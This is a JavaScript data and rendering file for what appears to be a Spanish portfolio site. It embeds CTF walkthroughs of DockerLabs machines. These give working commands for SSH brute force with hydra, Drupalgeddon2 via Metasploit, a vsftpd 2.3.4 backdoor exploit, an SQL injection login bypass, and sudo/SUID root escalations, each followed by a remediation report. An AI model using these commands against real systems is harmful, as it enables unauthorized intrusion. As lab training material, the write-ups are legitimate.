          "Credenciales distintas por servicio, política de contraseñas robustas y MFA en accesos remotos."
        ]
      ]
    },
    {
      "name": "Pequeñas Mentirosas",
      "slug": "pequenas-mentirosas",
      "diff": "Fácil",
      "plat": "DockerLabs",
      "meta": {
        "services": "22/tcp (SSH), 80/tcp (HTTP)",
        "jumps": 3
      },
      "desc": "Una pista en la web señala al usuario 'a', al que le saco la contraseña por fuerza bruta SSH con hydra. Desde dentro pivoto al usuario spencer con otra fuerza bruta y escalo a root abusando de sudo sobre python3.",
      "tags": [
        "Hydra",
        "Fuerza bruta SSH",
        "rockyou",
        "sudo",
        "Python",
        "GTFOBins"
      ],
      "body": [
        [
          "h",
          "Reconocimiento"
        ],
        [
          "c",
          "$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2\n$ nmap -sCV -p22,80 172.17.0.2\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))"
        ],
        [
          "p",
          "Dos puertos: SSH (22) y un servidor web (80). Empiezo por la web."
        ],
        [
          "h",
          "La pista de la web"
        ],
        [
          "p",
          "La web no tiene diseño ni contenido: solo un mensaje."
        ],
        [
          "c",
          "$ curl 172.17.0.2\n<html><body><h1>Pista: Encuentra la clave para A en los archivos.</h1></body></html>"
        ],
        [
          "p",
          "'La clave para A' apunta a un usuario llamado <strong>a</strong>. El fuzzing web no revela nada más, así que voy directo al SSH."
        ],
        [
          "h",
          "Fuerza bruta del usuario 'a'"
        ],
        [
          "c",
          "$ hydra -l a -P rockyou.txt ssh://172.17.0.2 -t 64\n[22][ssh] host: 172.17.0.2   login: a   password: secret\n1 of 1 target successfully completed, 1 valid password found"
        ],
        [
          "n",
          "Qué hace cada flag: <code>-l a</code> un único usuario · <code>-P rockyou.txt</code> la lista de contraseñas (-P fichero; -p sería una sola) · <code>ssh://172.17.0.2</code> protocolo y objetivo · <code>-t 64</code> 64 intentos en paralelo (con SSH a veces conviene bajarlo si da fallos)."
        ],
        [
          "p",
          "Credenciales <strong>a : secret</strong>. Entro por SSH, pero con este usuario no puedo hacer gran cosa: toca buscar por dónde seguir."
        ],
        [
          "c",
          "$ ssh a@172.17.0.2\na@172.17.0.2's password: (secret)\na@mentirosas:~$"
        ],
        [
          "h",
          "Pivote al usuario spencer"
        ],
        [
          "p",
          "Miro qué usuarios del sistema tienen shell."
        ],
        [
          "c",
          "$ cat /etc/passwd | grep \"/bin/bash\"\nroot:x:0:0:root:/root:/bin/bash\nspencer:x:1000:1000::/home/spencer:/bin/bash\na:x:1001:1001::/home/a:/bin/bash"
        ],
        [
          "p",
          "Aparece <strong>spencer</strong>. Le aplico la misma receta: fuerza bruta con hydra."
        ],
        [
          "c",
          "$ hydra -l spencer -P rockyou.txt ssh://172.17.0.2 -t 64\n[22][ssh] host: 172.17.0.2   login: spencer   password: password1\n$ su spencer\nPassword: (password1)\nspencer@mentirosas:~$"
        ],
        [
          "h",
          "Escalada a root · sudo python3"
        ],
        [
          "c",
          "$ sudo -l\nUser spencer may run the following commands on mentirosas:\n    (ALL) NOPASSWD: /usr/bin/python3"
        ],
        [
          "p",
          "spencer puede ejecutar <code>python3</code> como root sin contraseña. Según GTFOBins, le pido a Python que lance una bash."
        ],
        [
          "c",
          "$ sudo python3 -c 'import os; os.system(\"/bin/bash\")'\nroot@mentirosas:/home/spencer# whoami\nroot"
        ],
        [
          "p",
          "Máquina Pequeñas Mentirosas completada: <code>uid=0(root)</code>."
        ]
      ],
      "informe": [
        [
          "CRÍTICA",
          "Escalada a root por sudo NOPASSWD sobre python3",
          "CWE-250",
          "A05:2021 – Security Misconfiguration",
          "spencer puede ejecutar python3 como root sin contraseña; un one-liner le da shell root (GTFOBins).",
          "Eliminar o restringir la regla sudo; nunca conceder NOPASSWD sobre intérpretes (python, perl, etc.)."
        ],
        [
          "ALTA",
          "Contraseñas débiles y SSH sin límite de intentos",
          "CWE-521",
          "A07:2021 – Identification and Authentication Failures",
          "Los usuarios 'a' y 'spencer' usan contraseñas de diccionario (secret, password1) y el SSH no limita los intentos, así que caen por fuerza bruta.",
          "Contraseñas robustas, bloqueo tras N intentos (fail2ban), MFA y preferir autenticación por clave."
        ],
        [
          "BAJA",
          "Divulgación de un usuario válido en la web",
          "CWE-200",
          "A07:2021 – Identification and Authentication Failures",
          "La web revela la existencia del usuario 'a', dando al atacante un objetivo concreto para la fuerza bruta.",
          "No exponer nombres de usuario ni pistas sobre cuentas válidas en respuestas públicas."
        ]
      ]
    },
    {
      "name": "Ejotapete",
      "slug": "ejotapete",
      "diff": "Fácil",
      "plat": "DockerLabs",
      "meta": {
        "services": "80/tcp (HTTP)",
        "jumps": 2
      },
      "desc": "Drupal 8.5.0 vulnerable a Drupalgeddon2 explotado con Metasploit para shell de www-data, y escalada a root abusando del bit SUID en find.",
      "tags": [
        "Gobuster",
        "Drupal",
        "Drupalgeddon2",
        "Metasploit",
        "SUID find",
        "GTFOBins"
      ],
      "body": [
        [
          "h",
          "Reconocimiento"
        ],
        [
          "c",
          "$ sudo nmap -sCV -sS -n -Pn -p- 172.17.0.2\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd"
        ],
        [
          "p",
          "Solo el 80 (HTTP). Todo el juego está en la web."
        ],
        [
          "h",
          "Enumeración web"
        ],
        [
          "c",
          "$ gobuster dir -u http://172.17.0.2 -w directory-list-2.3-medium.txt -t 50\n/drupal               (Status: 301)"
        ],
        [
          "p",
          "<code>/drupal/</code> solo muestra un login que redirige. Fuzzeo más a fondo dentro de <code>core/</code>."
        ],
        [
          "c",
          "$ gobuster dir -u http://172.17.0.2/drupal/core/ -w directory-list-2.3-medium.txt -x html,php,txt,py,sh,log\n/install.php          (Status: 200)   <-- revela la versión del CMS"
        ],
        [
          "p",
          "<code>install.php</code> me chiva la versión exacta: <strong>Drupal 8.5.0</strong>."
        ],
        [
          "h",
          "Explotación · Drupalgeddon2"
        ],
        [
          "p",
          "Drupal 8.5.0 es vulnerable a Drupalgeddon2 (ejecución remota de código). Lo exploto con Metasploit."
        ],
        [
          "c",
          "$ sudo msfdb init && msfconsole\nmsf6 > use exploit/unix/webapp/drupal_drupalgeddon2\nmsf6 > set RHOSTS 172.17.0.2\nmsf6 > set TARGETURI /drupal\nmsf6 > run\n[*] Meterpreter session 1 opened\nmeterpreter >"
        ],
        [
          "h",
          "Escalada a root · SUID find"
        ],
        [
          "p",
          "Desde meterpreter lanzo una shell interactiva, la estabilizo y busco binarios SUID."
        ],
        [
          "c",
          "meterpreter > shell\n$ script /dev/null -c bash\nwww-data@a49dee0a69db:/var/www/html/drupal$ find / -perm -4000 2>/dev/null\n...\n/usr/bin/find   <-- abusable (GTFOBins)"
        ],
        [
          "p",
          "<code>/usr/bin/find</code> con SUID puede lanzar un shell privilegiado con <code>-exec</code>."
        ],
        [
          "c",
          "$ /usr/bin/find . -exec /bin/bash -p \\; -quit\n# whoami\nroot"
        ],
        [
          "p",
          "Máquina Ejotapete completada: Drupalgeddon2 + SUID find → root."
        ]
      ],
      "informe": [
        [
          "CRÍTICA",
          "RCE en Drupal 8.5.0 (Drupalgeddon2, CVE-2018-7600)",
          "CWE-94",
          "A06:2021 – Vulnerable and Outdated Components",
          "Una versión de Drupal sin parchear permite ejecución remota de código sin autenticación, dando una shell como www-data.",
          "Mantener el CMS y sus módulos actualizados; aplicar los parches de seguridad y retirar instalaciones expuestas como install.php."
        ],
        [
          "CRÍTICA",
          "Escalada a root por bit SUID en /usr/bin/find",
          "CWE-250",
          "A05:2021 – Security Misconfiguration",
          "find con SUID de root permite lanzar un shell privilegiado con -exec, pasando de www-data a root.",
          "Quitar el SUID (chmod u-s /usr/bin/find) y auditar los binarios con SUID."
        ]
      ]
    },
    {
      "name": "Obsession",
      "slug": "obsession",
      "diff": "Muy fácil",
      "plat": "DockerLabs",
      "meta": {
        "services": "21/tcp (FTP), 22/tcp (SSH), 80/tcp (HTTP)",
        "jumps": 2
      },
      "desc": "Directorio /backup expuesto con un usuario, fuerza bruta SSH con Hydra y escalada a root abusando de un sudo sobre Vim.",
      "tags": [
        "FTP",
        "Dirb",
        "Fuga de credenciales",
        "Hydra",
        "sudo Vim",
        "GTFOBins"
      ],
      "body": [
        [
          "h",
          "Reconocimiento"
        ],
        [
          "c",
          "$ sudo nmap -sCV -sS -n -Pn -p- 172.17.0.2\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.5   <-- login anónimo habilitado\n22/tcp open  ssh     OpenSSH 9.6p1\n80/tcp open  http    Apache httpd 2.4.58"
        ],
        [
          "p",
          "Tres servicios: FTP (con acceso anónimo), SSH y una web de coaching en el 80."
        ],
        [
          "h",
          "Enumeración web"
        ],
        [
          "p",
          "El código fuente de la web tiene un comentario sospechoso. Amplío la búsqueda de recursos ocultos con Dirb."
        ],
        [
          "c",
          "$ dirb http://172.17.0.2\n==> DIRECTORY: http://172.17.0.2/backup/\n+ http://172.17.0.2/backup/backup.txt (CODE:200)"
        ],
        [
          "p",
          "Dentro de <code>/backup/</code> hay un <code>backup.txt</code> con información sensible."
        ],
        [
          "c",
          "$ curl http://172.17.0.2/backup/backup.txt\nUsuario para todos mis servicios: russoski (cambiar pronto!)"
        ],
        [
          "p",
          "Tengo un usuario válido: <strong>russoski</strong>."
        ],
        [
          "h",
          "Explotación · fuerza bruta"
        ],
        [
          "c",
          "$ hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 50 -I\n[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme"
        ],
        [
          "p",
          "Con <strong>russoski : iloveme</strong> entro por SSH."
        ],
        [
          "c",
          "$ ssh russoski@172.17.0.2\nrussoski@a1919dfe5717:~$"
        ],
        [
          "h",
          "Escalada a root · sudo Vim"
        ],
        [
          "c",
          "$ sudo -l\nUser russoski may run the following commands on a1919dfe5717:\n    (root) NOPASSWD: /usr/bin/vim"
        ],
        [
          "p",
          "Vim ejecutable como root permite lanzar un shell desde su modo comando (<code>:!</code>), un abuso clásico de GTFOBins."
        ],
        [
          "c",
          "$ sudo /usr/bin/vim -c ':!/bin/bash'\n# whoami\nroot"
        ],
        [
          "p",
          "Máquina Obsession completada: <code>uid=0(root)</code>."
        ]
      ],
      "informe": [
        [
          "CRÍTICA",
          "Escalada a root por sudo sobre Vim",
          "CWE-250",
          "A05:2021 – Security Misconfiguration",
          "Vim ejecutable como root permite lanzar una shell desde su modo comando (:!), escalando a root (GTFOBins).",
          "Retirar Vim de sudoers; si se necesita edición privilegiada, usar herramientas acotadas como sudoedit."
        ],
        [
          "ALTA",
          "Backup con información sensible expuesto en la web",
          "CWE-538",
          "A01:2021 – Broken Access Control",
          "El directorio /backup es accesible y su backup.txt filtra un usuario válido (russoski).",
          "No alojar copias de seguridad dentro del webroot y aplicar control de acceso a los recursos internos."
        ],
        [
          "ALTA",
          "Contraseña débil susceptible a fuerza bruta",
          "CWE-521",
          "A07:2021 – Identification and Authentication Failures",
          "La cuenta russoski usa una contraseña de diccionario (iloveme), accesible por SSH mediante fuerza bruta.",
          "Contraseñas robustas, bloqueo de intentos (fail2ban) y autenticación por clave."
        ],
        [
          "MEDIA",
          "Acceso anónimo al servicio FTP",
          "CWE-306",
          "A05:2021 – Security Misconfiguration",
          "El FTP permite login anónimo, ampliando la superficie de ataque y la posible exposición de ficheros.",
          "Deshabilitar el acceso anónimo y exigir autenticación."
        ]
      ]
    },
    {
      "name": "BorazuwarahCTF",
      "slug": "borazuwarahctf",
      "diff": "Muy fácil",
      "plat": "DockerLabs",
      "meta": {
        "services": "22/tcp (SSH), 80/tcp (HTTP)",
        "jumps": 2
      },
      "desc": "Usuario oculto en los metadatos de una imagen (Exiftool), fuerza bruta SSH con Hydra y escalada a root por un sudo mal configurado.",
      "tags": [
        "Esteganografía",
        "Exiftool",
        "Hydra",
        "sudo NOPASSWD"
      ],
      "body": [
        [
          "h",
          "Reconocimiento"
        ],
        [
          "c",
          "$ sudo nmap -sCV -sS -n -Pn -p- 172.17.0.2\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1\n80/tcp open  http    Apache httpd 2.4.59"
        ],
        [
          "p",
          "La web del 80 solo muestra una imagen de un huevo Kinder Sorpresa. Huele a esteganografía."
        ],
        [
          "h",
          "Enumeración web y esteganografía"
        ],
        [
          "p",
          "Gobuster no encuentra recursos, así que descargo la imagen y miro sus metadatos con Exiftool."
        ],
        [
          "c",
          "$ exiftool huevo.jpeg\n...\nDescription : User: borazuwarah\n..."
        ],
        [
          "p",
          "Los metadatos filtran un usuario: <strong>borazuwarah</strong>."
        ],
        [
          "h",
          "Explotación · fuerza bruta"
        ],
        [
          "c",
          "$ hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2\n[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456"
        ],
        [
          "p",
          "Con <strong>borazuwarah : 123456</strong> entro por SSH."
        ],
        [
          "c",
          "$ ssh borazuwarah@172.17.0.2\nborazuwarah@bdff3a8acd18:~$"
        ],
        [
          "h",
          "Escalada a root · sudo NOPASSWD"
        ],
        [
          "c",
          "$ sudo -l\nUser borazuwarah may run the following commands on bdff3a8acd18:\n    (ALL) NOPASSWD: /bin/bash"
        ],
        [
          "p",
          "Poder ejecutar <code>/bin/bash</code> como cualquier usuario sin contraseña es un shell de root servido en bandeja."
        ],
        [
          "c",
          "$ sudo -u root /bin/bash\n# whoami\nroot"
        ],
        [
          "p",
          "Máquina BorazuwarahCTF completada: <code>uid=0(root)</code>."
        ]
      ],
      "informe": [
        [
          "CRÍTICA",
          "Escalada a root por sudo NOPASSWD sobre /bin/bash",
          "CWE-250",
          "A05:2021 – Security Misconfiguration",
          "Poder ejecutar /bin/bash como cualquier usuario sin contraseña es una shell de root directa.",
          "Eliminar esa regla de sudoers; conceder solo comandos concretos y necesarios."
        ],
        [
          "ALTA",
          "Contraseña débil susceptible a fuerza bruta",
          "CWE-521",
          "A07:2021 – Identification and Authentication Failures",
          "La cuenta usa una contraseña trivial (123456), accesible por SSH mediante fuerza bruta.",
          "Contraseñas robustas, bloqueo de intentos (fail2ban) y autenticación por clave."
        ],
        [
          "MEDIA",
          "Información sensible en los metadatos de una imagen",
          "CWE-200",
          "A05:2021 – Security Misconfiguration",
          "Los metadatos EXIF de la imagen publicada filtran un nombre de usuario válido (borazuwarah).",
          "Limpiar los metadatos de los ficheros antes de publicarlos (p. ej. exiftool -all=)."
        ]
      ]
    },
    {
      "name": "BreakMySSH",
      "slug": "breakmyssh",
      "diff": "Muy fácil",
      "plat": "DockerLabs",
      "meta": {
        "services": "22/tcp (SSH)",
        "jumps": 1
      },
      "desc": "Único puerto SSH; fuerza bruta con Hydra sobre root revela la contraseña y da acceso directo como root.",
      "tags": [
        "SSH",
        "Hydra",
        "Fuerza bruta"
      ],
      "body": [
        [
          "h",
          "Reconocimiento"
        ],
        [
          "c",
          "$ sudo nmap -p- -sS -sV --min-rate=5000 -n -Pn --open 172.17.0.2\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH"
        ],
        [
          "p",
          "Solo hay SSH (22). Como no hay más superficie, pruebo fuerza bruta directamente."
        ],
        [
          "h",
          "Explotación · fuerza bruta sobre root"
        ],
        [
          "c",
          "$ hydra -l root -P /usr/share/wordlists/rockyou.txt -t 16 -vV ssh://172.17.0.2\n[22][ssh] host: 172.17.0.2   login: root   password: estrella"
        ],
        [
          "p",
          "Las credenciales son directamente de <strong>root : estrella</strong>."
        ],
        [
          "c",
          "$ ssh root@172.17.0.2\n# whoami\nroot"
        ],
        [
          "p",
          "La contraseña encontrada es la del propio usuario root, así que el acceso ya es total: no hace falta escalar. Máquina BreakMySSH completada."
        ]
      ],
      "informe": [
        [
          "CRÍTICA",
          "Contraseña de root débil accesible por fuerza bruta",
          "CWE-521",
          "A07:2021 – Identification and Authentication Failures",
          "La contraseña de root es de diccionario y el SSH no limita los intentos, dando acceso root directo.",
          "Contraseña robusta, bloqueo de intentos (fail2ban) y, preferiblemente, autenticación por clave."
        ],
        [
          "MEDIA",
          "Login SSH directo de root habilitado",
          "CWE-250",
          "A05:2021 – Security Misconfiguration",
          "Permitir el acceso directo de root por SSH expone la cuenta más crítica del sistema al ataque.",
          "PermitRootLogin no (o prohibit-password) y operar con un usuario sin privilegios + sudo."
        ]
      ]
    },
    {
      "name": "FirstHacking",
      "slug": "firsthacking",
      "diff": "Muy fácil",
      "plat": "DockerLabs",
      "meta": {
        "services": "21/tcp (FTP)",
        "jumps": 1
      },
      "desc": "Único puerto FTP con vsftpd 2.3.4 vulnerable; su backdoor da shell de root directa mediante un exploit público.",
      "tags": [
        "FTP",
        "vsftpd 2.3.4",
        "Backdoor",
        "Exploit",
        "RCE"
      ],
      "body": [
        [
          "h",
          "Reconocimiento"
        ],
        [
          "c",
          "$ sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts\nPORT   STATE SERVICE\n21/tcp open  ftp\n\n$ nmap -p 21 -sC -sV 172.17.0.2 -oN targeted\n21/tcp open  ftp     vsftpd 2.3.4"
        ],
        [
          "p",
          "Solo el 21 (FTP), con <strong>vsftpd 2.3.4</strong>: una versión con una backdoor conocida (CVE-2011-2523)."
        ],
        [
          "h",
          "Explotación · backdoor de vsftpd 2.3.4"
        ],
        [
          "p",
          "Esta versión incluye una puerta trasera que da acceso directo como root. Uso un exploit público en un entorno virtual para instalar las dependencias."
        ],
        [
          "c",
          "$ python3 -m venv venv && source venv/bin/activate\n$ python3 -m pip install pwntools\n$ git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git\n$ cd vsftpd_2.3.4_Exploit && chmod +x exploit.py\n$ python3 exploit.py 172.17.0.2\n[+] Backdoor activado\n# whoami\nroot"
        ],
        [
          "p",
          "La propia vulnerabilidad otorga una shell como root, así que no hacen falta pasos de escalada. Máquina FirstHacking completada."
        ]
      ],
      "informe": [
        [
          "CRÍTICA",
          "Backdoor en vsftpd 2.3.4 (CVE-2011-2523)",
          "CWE-506",
          "A06:2021 – Vulnerable and Outdated Components",
          "Esta versión de vsftpd contiene una puerta trasera conocida que otorga una shell como root sin autenticación.",
          "Actualizar vsftpd a una versión parcheada y verificar la integridad del software instalado desde fuentes de confianza."
        ]
      ]
    },
    {
      "name": "HedgeHog",
      "slug": "hedgehog",
      "diff": "Muy fácil",
      "plat": "DockerLabs",
      "meta": {
        "services": "22/tcp (SSH), 80/tcp (HTTP)",
        "jumps": 3
      },
      "desc": "Usuario filtrado en la web, fuerza bruta SSH con un rockyou invertido y escalada encadenada tails → sonic → root vía sudo.",
      "tags": [
        "Gobuster",
        "Diccionario invertido",
        "Hydra",
        "sudo -u",
        "Escalada encadenada"
      ],
      "body": [
        [
          "h",
          "Reconocimiento"
        ],
        [
          "c",
          "$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oN allPorts\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http"
        ],
        [
          "p",
          "Al abrir el puerto 80, la web solo muestra la palabra 'tails': pinta de nombre de usuario. Gobuster no encuentra más directorios, así que la pista sigue siendo el usuario <strong>tails</strong>."
        ],
        [
          "h",
          "Explotación · rockyou invertido"
        ],
        [
          "p",
          "La fuerza bruta normal no da resultado. Como truco, invierto el orden del rockyou.txt y elimino los espacios."
        ],
        [
          "c",
          "$ cp /usr/share/wordlists/rockyou.txt .\n$ tac rockyou.txt >> invertido.txt\n$ sed -i 's/ //g' invertido.txt\n$ hydra -l tails -P invertido.txt ssh://172.17.0.2\n[22][ssh] host: 172.17.0.2   login: tails   password: 3117548331"
        ],
        [
          "p",
          "Con <strong>tails : 3117548331</strong> entro por SSH."
        ],
        [
          "c",
          "$ ssh tails@172.17.0.2\ntails@hedgehog:~$"
        ],
        [
          "h",
          "Escalada encadenada · tails → sonic → root"
        ],
        [
          "c",
          "$ sudo -l\nUser tails may run the following commands:\n    (sonic) NOPASSWD: ALL\n$ sudo -u sonic /bin/bash\nsonic@hedgehog:~$ whoami\nsonic"
        ],
        [
          "p",
          "sonic, a su vez, puede ejecutar cualquier comando como cualquier usuario, incluido root."
        ],
        [
          "c",
          "$ sudo -u root /bin/bash\n# whoami\nroot"
        ],
        [
          "p",
          "Máquina HedgeHog completada: cadena tails → sonic → root."
        ]
      ],
      "informe": [
        [
          "CRÍTICA",
          "Escalada a root por sudo encadenado mal configurado",
          "CWE-250",
          "A05:2021 – Security Misconfiguration",
          "Permisos sudo excesivos permiten saltar de tails a sonic y de sonic a root (sonic puede ejecutar cualquier comando como cualquier usuario).",
          "Revisar sudoers con mínimo privilegio; evitar comodines y permisos que permitan ejecutar como cualquier usuario."
        ],
        [
          "ALTA",
          "Contraseña débil susceptible a fuerza bruta",
          "CWE-521",
          "A07:2021 – Identification and Authentication Failures",
          "La contraseña está en variantes de rockyou, accesible por SSH mediante fuerza bruta.",
          "Contraseñas robustas, bloqueo de intentos (fail2ban) y autenticación por clave."
        ],
        [
          "BAJA",
          "Divulgación de un usuario válido en la web",
          "CWE-200",
          "A07:2021 – Identification and Authentication Failures",
          "La web muestra el nombre de usuario 'tails', dando un objetivo directo para la fuerza bruta.",
          "No exponer nombres de usuario ni pistas sobre cuentas en contenido público."
        ]
      ]
    },
    {
      "name": "Injection",
      "slug": "injection",
      "diff": "Fácil",
      "plat": "DockerLabs",
      "meta": {
        "services": "22/tcp (SSH), 80/tcp (HTTP)",
        "jumps": 2
      },
      "desc": "Bypass de autenticación por SQL injection para filtrar credenciales, acceso por SSH y escalada a root abusando del bit SUID en /usr/bin/env.",
      "tags": [
        "SQLi",
        "Bypass de login",
        "SSH",
        "SUID",
        "GTFOBins"
      ],
      "body": [
        [
          "h",
          "Reconocimiento"
        ],
        [
          "c",
          "$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts\nPORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack\n80/tcp open  http    syn-ack"
        ],
        [
          "p",
          "Dos puertos abiertos: SSH (22) y un servidor web (80). La web es el punto de entrada más prometedor."
        ],
        [
          "h",
          "Bypass de login con SQL Injection"
        ],
        [
          "p",
          "Al abrir <code>http://172.17.0.2</code> aparece un panel de login: el candidato perfecto para una inyección SQL que eluda la autenticación."
        ],
        [
          "n",
          "En el campo usuario meto <code>admin' or 1=1-- -</code> y en contraseña cualquier valor. La condición <code>1=1</code> hace que la consulta sea siempre verdadera y salta el control de credenciales."
        ],
        [
          "p",
          "La aplicación no solo me deja pasar: además filtra las credenciales de un usuario real."
        ],
        [
          "c",
          "Bienvenido Dylan! Has insertado correctamente tu contraseña:\nKJSDFG789FGSDF78"
        ],
        [
          "p",
          "Tengo un par de credenciales válidas — <strong>dylan : KJSDFG789FGSDF78</strong> — que probaré contra el SSH."
        ],
        [
          "h",
          "Acceso por SSH"
        ],
        [
          "c",
          "$ ssh dylan@172.17.0.2\ndylan@172.17.0.2's password: (KJSDFG789FGSDF78)\nWelcome to Ubuntu 22.04.4 LTS\ndylan@11574bbb421e:~$"
        ],
        [
          "h",
          "Escalada a root · SUID"
        ],
        [
          "c",
          "$ find / -perm -4000 -type f 2>/dev/null\n...\n/usr/bin/env   <-- binario abusable"
        ],
        [
          "p",
          "<code>/usr/bin/env</code> aparece en la lista. Según GTFOBins, con el bit SUID puedo usarlo para lanzar un shell que herede los privilegios del propietario. El flag <code>-p</code> evita que sh descarte el EUID heredado."
        ],
        [
          "c",
          "$ /usr/bin/env /bin/sh -p\n# whoami\nroot"
        ],
        [
          "p",
          "Máquina Injection completada: <code>uid=0(root)</code>."
        ]
      ],
      "informe": [
        [
          "CRÍTICA",
          "Escalada a root por bit SUID en /usr/bin/env",
          "CWE-250",
          "A05:2021 – Security Misconfiguration",
          "env tiene el bit SUID de root: cualquier usuario local obtiene una shell root en un solo paso (GTFOBins).",
          "Quitar el SUID (chmod u-s /usr/bin/env) y auditar los binarios con SUID; principio de mínimo privilegio."
        ],
        [
          "ALTA",
          "Inyección SQL con bypass de autenticación",
          "CWE-89",
          "A03:2021 – Injection",
          "El login no sanea la entrada: un payload 'or 1=1' salta la autenticación y, además, la aplicación devuelve credenciales válidas de un usuario real.",
          "Consultas parametrizadas (prepared statements) o un ORM; nunca construir la consulta concatenando la entrada del usuario."
        ],
        [
          "MEDIA",
          "Reutilización de credenciales (web → SSH)",
          "CWE-522",
          "A07:2021 – Identification and Authentication Failures",
          "La contraseña filtrada por la web sirve tal cual para el acceso por SSH del usuario dylan.",
          "Credenciales distintas por servicio, rotación periódica y MFA en accesos remotos."
        ]
      ]
    }
  ];

  /* ---------------- RENDER ---------------- */
  $("#edu").innerHTML = EDU.map((e) => `
    <article class="node panel reveal ${e.now ? "current" : ""}" id="est-${slug(e.t)}">
      <span class="mark"></span>
      <div class="node-top"><h3>${e.t} — <em>${e.s}</em></h3><span class="lvl">${e.lvl} · ${e.dur}</span></div>
      <p>${e.d}</p>
      ${e.now ? '<span class="now">● EN PROCESO</span>' : ""}
    </article>`).join("");

  $("#quests").innerHTML = EXP.map((q, i) => `
    <article class="quest panel reveal" id="exp-${slug(q.co)}">
      <div class="quest-head"><span class="quest-id">MISSION #${String(i + 1).padStart(2, "0")}</span>
        <span class="quest-state">✔ COMPLETADA</span></div>
      <h3>${q.co}</h3>
      <p class="role">${q.role}</p>
      ${q.place ? `<p class="place">${q.place}</p>` : ""}
      <p class="desc">${q.d}</p>
      <div class="xp">XP <div class="bar"><i data-w="${q.xp}"></i></div> +${q.xp * 10}</div>
    </article>`).join("");

  // tools — compact stack grouped by category
  const TYPE_LABEL = { of: "Ofensivo", def: "Defensivo", base: "Base" };
  $("#tool-tabs").innerHTML = [["all", "Todo", ALL_TOOLS.length]].concat(
    Object.entries(TYPE_LABEL).map(([k, l]) => [k, l, ALL_TOOLS.filter((t) => t.type === k).length]))
    .map(([k, l, n], i) => `<button class="tab${i ? "" : " active"}" data-type="${k}" role="tab" type="button">${l}<sup>${n}</sup></button>`).join("");
  $("#side-tools").innerHTML = TOOLS.map((g) => `<li><a href="#h-${slug(g.cat)}">${esc(g.cat)}</a></li>`).join("");
  function renderTools(type) {
    closeTip();
    let i = 0;
    $("#inventory").innerHTML = TOOLS.map((g) => {
      const start = i; i += g.items.length;
      if (type !== "all" && g.type !== type) return "";
      return `<div class="stack-cat" id="h-${slug(g.cat)}" style="--c:${g.color}">
        <div class="stack-head"><b>${esc(g.cat)}</b><span class="n">${g.items.length}</span><span class="t">${TYPE_LABEL[g.type].toUpperCase()}</span></div>
        <div class="stack-items">${g.items.map(([name], j) => `<button class="slot" type="button" data-i="${start + j}" aria-haspopup="dialog">${esc(name)}</button>`).join("")}</div>
      </div>`;
    }).join("");
    if (window.gsap && !reduced) gsap.from("#inventory .stack-cat", { opacity: 0, y: 12, duration: .35, stagger: .03, ease: "power2.out", clearProps: "transform,opacity" });
  }
  $("#tool-tabs").addEventListener("click", (e) => {
    const b = e.target.closest(".tab"); if (!b) return;
    $$("#tool-tabs .tab").forEach((t) => t.classList.toggle("active", t === b));
    renderTools(b.dataset.type);
  });

  // tool info popover
  const TYPE = { of: ["OFENSIVO", "#f03a65"], def: ["DEFENSIVO", "#7f8ff2"], base: ["BASE", "#ebe3f3"] };
  const tip = document.createElement("div");
  tip.className = "tip"; tip.setAttribute("role", "dialog"); tip.setAttribute("aria-label", "Información de la herramienta");
  document.body.appendChild(tip);
  let tipSlot = null;
  function placeTip(slot) {
    if (innerWidth <= 600) { tip.classList.remove("above", "below"); return; }
    // work in page px so the popover lines up when the page is zoomed
    const k = zoomK(), b = slot.getBoundingClientRect(), tw = tip.offsetWidth, th = tip.offsetHeight;
    const r = { left: b.left / k, top: b.top / k, bottom: b.bottom / k, width: b.width / k };
    const vw = document.documentElement.clientWidth / k, vh = innerHeight / k;
    const left = Math.max(12, Math.min(r.left + r.width / 2 - tw / 2, vw - tw - 12));
    const below = r.bottom + th + 20 < vh || r.top - th - 20 < 70;
    tip.style.left = left + scrollX / k + "px";
    tip.style.top = (below ? r.bottom + 12 : r.top - th - 12) + scrollY / k + "px";
    tip.classList.toggle("below", below); tip.classList.toggle("above", !below);
    tip.style.setProperty("--ax", Math.max(14, Math.min(tw - 26, r.left + r.width / 2 - left - 6)) + "px");
  }
  function openTip(slot) {
    const t = ALL_TOOLS[+slot.dataset.i], [tl, tc] = TYPE[t.type];
    const list = $$("#inventory .slot"), idx = list.indexOf(slot);
    if (tipSlot) tipSlot.classList.remove("open");
    tipSlot = slot; slot.classList.add("open"); slot.setAttribute("aria-expanded", "true");
    tip.style.setProperty("--tc", t.color);
    tip.innerHTML = `
      <button class="tip-close" type="button" aria-label="Cerrar">✕</button>
      <div class="tip-head"><span class="tip-type" style="background:${tc}">${tl}</span><span class="tip-cat">${esc(t.cat)}</span></div>
      <h4>${esc(t.name)}</h4>
      <p>${esc(t.desc)}</p>
      <div class="tip-foot"><span>${idx + 1}/${list.length} · ESC para cerrar</span>
        <span class="tip-nav"><button type="button" data-d="-1" aria-label="Anterior">‹</button><button type="button" data-d="1" aria-label="Siguiente">›</button></span></div>`;
    placeTip(slot);
    tip.classList.add("show");
  }
  function closeTip() {
    tip.classList.remove("show");
    if (tipSlot) { tipSlot.classList.remove("open"); tipSlot.setAttribute("aria-expanded", "false"); }
    tipSlot = null;
  }
  function stepTip(d) {
    if (!tipSlot) return;
    const list = $$("#inventory .slot"), next = list[(list.indexOf(tipSlot) + d + list.length) % list.length];
    next.focus({ preventScroll: true }); openTip(next);
    if (innerWidth > 600) next.scrollIntoView({ block: "nearest", behavior: reduced ? "auto" : "smooth" });
  }
